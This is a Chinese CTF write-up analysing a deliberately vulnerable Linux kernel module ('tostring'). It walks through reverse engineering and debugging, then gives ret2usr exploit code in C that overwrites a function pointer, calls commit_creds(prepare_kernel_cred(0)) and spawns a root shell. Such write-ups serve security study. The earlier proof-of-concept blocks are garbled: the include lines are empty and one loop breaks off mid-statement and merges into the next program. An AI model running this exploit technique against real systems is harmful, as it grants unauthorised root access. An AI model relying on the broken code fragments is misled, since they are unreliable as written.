    -device virtio-9p-pci,id=fs0,fsdev=fsdev-fs0,mount_tag=rootme
来启动这个Kernel。
**🚫：此处若使用Mac os下的`qemu-system`将会显示`There is no option group
'fsdev'`错误，因此请使用Ubuntu作为调试环境。**
###  分析Init文件
    #!/bin/sh
    mount -t devtmpfs none /dev
    mount -t proc proc /proc
    mount -t sysfs sysfs /sys
    #
    # flag
    #
    mkdir -p /passwd
    mount -t ext2 -o ro /dev/sda /passwd
    #
    # share
    #
    mkdir -p /mnt/share
    mount -t 9p -o trans=virtio rootme /mnt/share/ -oversion=9p2000.L,posixacl,sync
    chmod 777 /mnt/share/
    #
    # module
    #
    insmod /lib/modules/*/rootme/*.ko
    chmod 666 /dev/tostring 
    # mmap_min_addr to 0 for the challenge to be simpler for now ;)
    echo 0 > /proc/sys/vm/mmap_min_addr
    #
    # shell
    #
    cat /etc/issue
    export ENV=/etc/profile
    setsid cttyhack setuidgid 1000 sh
    umount /proc
    umount /sys
    umount /dev
    poweroff -f
程序将位于`/lib/modules/*/rootme/*.ko`的LKMs文件使用`insmod`命令加载到Kernel。
在那之后， **解除了`mmap_min_addr`保护**。
并且可以看出，我们需要读取的flag将位于`/dev/sda`。
###  LKMs文件分析
仅开启了LKMs保护，并且题目提示没有开启其余保护，那么我们使用IDA分析该文件。
####  tostring_init()
首先，程序使用`alloc_chrdev_region`函数，来让内核自动给我们分配设备号。
然后程序创建一个设备类，命名为`chrdrv`。
接下来创建设备节点，成功后则开始初始化`cdev`。可以看出，这是一个字符设备，而这个字符设备为我们提供了几个函数。那么我们可以写一个PoC直接调用相关函数。
####  tostring_open()
打印`'6Tostring: open()'`后返回。
####  tostring_read(int a1)
打印`'6Tostring: read()'`后，将传入的值作为参数调用`0x8000984`。
####  tostring_read_dec(size_t maxlen, char *s)
打印`'6Tostring: read_dec()'`后，若`tostring`的值大于零，将`[0x8000784 + 2 * (tostring -1)]`使用`snprintf`按`"%lldn"`格式化后打印最多`maxlen`个字节到传入的参数`s`中并返回，在那之后，`tostring-1`。
####  tostring_read_hexa(size_t maxlen, char *s)
与`tostring_read_dec(size_t maxlen, char *s)`类似，只不过，这次程序将打印信息换为了`6Tostring:
read_hexa()`，格式化控制符换为了`"%16llxn"`。
####  tostring_write(int a1, int a2)
打印`'6Tostring:
write()'`后，程序将分配一个Chunk，然后将a2的前a1个字节读入Chunk，同时，我们输入的数据若以`MH`或`MD`开头，将改变`0x8000984`处的值到底是`tostring_read_dec`亦或是`tostring_read_hexa`。若输入的数据不以`MH`或`MD`开头，程序将Chunk的地址置于`0x8000784
+ 2 * tostring`处。随后，`tostring + 1`。
####  echo测试
我们使用`echo "1111" > /dev/tostring`来测试设备是否挂载正常
发现程序正常的调用了我们分析的函数链。
###  动态调试
对于内核的调试，我们首先需要知道我们的LKMs被加载到了程序的哪个位置，也就是需要知道其`.text、.bss、.data`节区地址。
对于这些地址，它们通常会被保存到系统的`/sys/module/[模块名]`目录下。
⚠️：此处注意，我们加载到内核的模块名不一定是模块文件的名字，可以使用`lsmod`命令查看。
接下来我们来查看节区地址：
接下来我们可以使用`add-symbol-file`这个gdb命令向gdb指定这三个地址。
然后就可以附加调试了，我们将断点下在write函数的入口处。
成功下断。
###  LKMs漏洞分析
可以看到，程序在读入我们发送的值时，没有做长度限定，那么，我们事实上可以读入任意长字节。
而程序的`0x08000984`处存储了我们read时即将调用的指针，那么我们完全可以覆盖掉那个指针为我们想要其为的值。
控制其的PoC为：
    #include 
    #include 
    #include 
    #include 
    int main(){
        char Padding[9] = "AAAAAAAA";
        char Eip[5] ;
        int fd = open("/dev/tostring",O_WRONLY);
        for(int i = 0;i 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    struct trap_frame{
        void *eip;
        uint32_t cs;
        uint32_t eflags;
        void *esp;
        uint32_t ss;
    }__attribute__((packed));
    struct trap_frame tf;
    void get_shell(void){
        execl("/bin/sh", "sh", NULL);
    }
    void init_tf_work(void){
        asm("pushl %cs;popl tf+4;"    //set cs
            "pushfl;popl tf+8;"       //set eflags
            "pushl %esp;popl tf+12;"
            "pushl %ss;popl tf+16;");
        tf.eip = &get_shell;
        tf.esp -= 1024;
    }
    #define KERNCALL __attribute__((regparm(3)))
    void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xC10711F0;
    void* (*commit_creds)(void*) KERNCALL = (void*) 0xC1070E80;
    void payload(void){
        commit_creds(prepare_kernel_cred(0));
        asm("mov $tf,%esp;"
              "iret;");
    }
    int main(void){
        char Padding[9] = "AAAAAAAA";
        char Eip[5] ;
        init_tf_work();
        int fd = open("/dev/tostring",2);
        for(int i = 0;i 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    struct trap_frame{
        void *eip;
        uint32_t cs;
        uint32_t eflags;
        void *esp;
        uint32_t ss;
    }__attribute__((packed));
    struct trap_frame tf;
    static char receive[256];
    void get_shell(void){
        execl("/bin/sh", "sh", NULL);
    }
    void init_tf_work(void){
        asm("pushl %cs;popl tf+4;"    //set cs
            "pushfl;popl tf+8;"       //set eflags
            "pushl %esp;popl tf+12;"
            "pushl %ss;popl tf+16;");
        tf.eip = &get_shell;
        tf.esp -= 1024;
    }
    #define KERNCALL __attribute__((regparm(3)))
    void* (*prepare_kernel_cred)(void*) KERNCALL = (void*) 0xC10711F0;
    void* (*commit_creds)(void*) KERNCALL = (void*) 0xC1070E80;
    void payload(void){
        commit_creds(prepare_kernel_cred(0));
        asm("mov $tf,%esp;"
              "iret;");
    }
    int main(void){
        char Padding[9] = "AAAAAAAA";
        char Eip[5];
        init_tf_work();
        int fd = open("/dev/tostring",2);
        for(int i = 0;i < 0x40; i++)
            write(fd,Padding,sizeof(Padding));
        write(1,"OK!n",sizeof(Eip));
        *((void**)(Eip)) = &payload;
        write(fd,Eip,sizeof(Eip));
        read(fd,receive,255);
        return 0;
    }
## 0x08 参考链接
[CTF-Wiki Linux Kernel](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel)
[Exploiting Stack Overflows in the Linux Kernel – Jon
Oberheide](https://jon.oberheide.org/blog/2010/11/29/exploiting-stack-overflows-in-the-linux-kernel/)
[A Kernel Exploit Step by Step –
akliilias](https://www.coursehero.com/file/49274885/kernel-exploit-step-by-steppdf/)
[kernel pwn（0）：入门&ret2usr – Magpie](https://www.anquanke.com/post/id/172216)
[Linux-内核编译 –
咲夜南梦](https://196011564.github.io/2020/02/26/Linux-%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91/#%E6%89%A7%E8%A1%8C%E4%BB%A5%E4%B8%8B%E5%91%BD%E4%BB%A4%E4%B8%8B%E8%BD%BDkernel%E6%BA%90%E7%A0%81)